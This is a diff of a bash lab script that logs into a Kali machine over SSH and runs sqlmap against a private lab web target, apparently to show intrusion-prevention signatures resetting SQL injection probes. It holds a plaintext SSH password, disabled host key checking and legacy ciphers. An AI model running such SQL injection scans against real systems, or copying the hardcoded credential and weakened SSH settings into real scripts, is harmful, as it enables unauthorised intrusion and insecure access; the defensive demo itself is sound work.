@@ -1,19 +1,20 @@
 #!/bin/bash
 # SQL Injection attack from Kali using sqlmap
-# Triggers: HTTP:SQL:* IDP signatures
+# Triggers: HTTP:SQL:INJ:* and HTTP:INVALID:* IDP signatures
 
 SSH_OPTS="-o StrictHostKeyChecking=no -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc,aes128-cbc"
 KALI="100.123.38.1"
 TARGET="192.168.20.2"
 
-echo "=== SQL Injection Attack ==="
+echo "=== SQL Injection Attack — sqlmap ==="
 echo "Attacker : Kali (192.168.10.2)"
-echo "Target   : Linux (${TARGET})"
+echo "Target   : Linux (${TARGET}:80/items?id=1)"
 echo "Tool     : sqlmap"
-echo "Triggers : HTTP:SQL:* IDP signatures"
+echo ""
+echo "WITHOUT IDP: sqlmap probes the parameter and enumerates injection points"
+echo "WITH IDP:    every probe gets a connection reset — sqlmap gives up"
 echo ""
 echo "Starting SQL injection probe..."
-echo "(With IDP active, connections will be reset mid-attack)"
 echo ""
 
 sshpass -p 'Juniper!1' ssh $SSH_OPTS jcluser@$KALI \
@@ -24,7 +25,8 @@ sshpass -p 'Juniper!1' ssh $SSH_OPTS jcluser@$KALI \
      --timeout=5 \
      --retries=0 \
      --output-dir=/tmp/sqlmap-out \
-     2>&1 | grep -E 'testing|injection|error|connection|WARNING|CRITICAL|payload' | tail -20" 2>/dev/null
+     2>&1" 2>/dev/null
 
 echo ""
-echo "Attack complete. Check monitor-idp.sh for IDP hit counters."
+echo "Attack complete. Check IDP hit counters:"
+echo "  bash /root/lab/idp-demo/monitor-idp.sh"
